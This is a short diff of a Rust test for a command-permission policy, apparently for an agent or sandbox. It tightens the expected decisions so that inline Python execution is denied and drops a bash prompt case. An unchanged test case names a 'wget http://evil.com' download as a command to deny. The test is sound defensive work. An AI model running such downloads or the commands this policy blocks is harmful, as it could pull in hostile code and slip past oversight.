@@ -367,15 +367,14 @@ fn test_default_dangerous_commands() {
             vec!["wget".to_string(), "http://evil.com".to_string()],
             Decision::Deny,
         ),
-        // Shell escape (should prompt)
-        (vec!["bash".to_string()], Decision::Prompt),
+        // Indirect command execution (should deny - security fix)
         (
             vec![
                 "python".to_string(),
                 "-c".to_string(),
                 "import os".to_string(),
             ],
-            Decision::Prompt,
+            Decision::Deny,
         ),
         (vec!["vim".to_string()], Decision::Prompt),
         // Git (should prompt)
